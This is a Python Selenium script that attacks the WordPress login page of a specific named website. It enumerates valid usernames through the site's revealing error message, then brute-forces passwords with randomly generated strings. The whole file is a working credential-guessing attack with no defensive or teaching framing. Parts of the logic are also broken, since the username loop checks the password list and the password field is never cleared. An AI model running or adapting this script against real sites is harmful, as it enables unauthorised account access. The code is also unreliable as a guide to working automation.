from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import random, string, time

browser = webdriver.Chrome(executable_path="/Users/Luke/Desktop/chromedriver")
url='https://unswprojecthope.org/portal/'

browser.get(url)

def id_generator(size, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

pwVisited = []
userVisited = []
def guessUsername(digit,possibilities):
    while len(pwVisited)<possibilities:
        user = id_generator(digit,"123456789abcdefghijklmnopqrstuvwxyz")
        if user not in userVisited:
            userVisited.append(user)
        else:
            continue
        print(user)
        browser.find_element_by_xpath("//*[@id='user_login']").clear()
        browser.find_element_by_xpath("//*[@id='user_login']").send_keys(user)
        browser.find_element_by_xpath("//*[@id='user_pass']").send_keys("1")
        browser.find_element_by_xpath("//*[@id='wp-submit']").click()
         # wait until results are loaded
        usernameDone = WebDriverWait(browser, 10).until(
            EC.presence_of_element_located((By.XPATH, "//*[@id='login_error']")))
        if "for the username" in str(browser.find_element_by_xpath("//*[@id='login_error']").text):
            print("Username is",user)
            break

def guessPassword(digit, possibilities):
    while len(pwVisited)<possibilities:
        password = id_generator(digit,"0123456789abcdefghijklmnopqrstuvwxyz")
        print(password)
        if password not in pwVisited:
            pwVisited.append(password)
        else:
            continue
        browser.find_element_by_xpath("//*[@id='user_pass']").send_keys(password)

        browser.find_element_by_xpath("//*[@id='wp-submit']").click()
        '''
        except:
            print("Password is", pwVisited[-2])
            break
        '''
    pwVisited.clear()

guessUsername(1,36)
guessPassword(1,36)









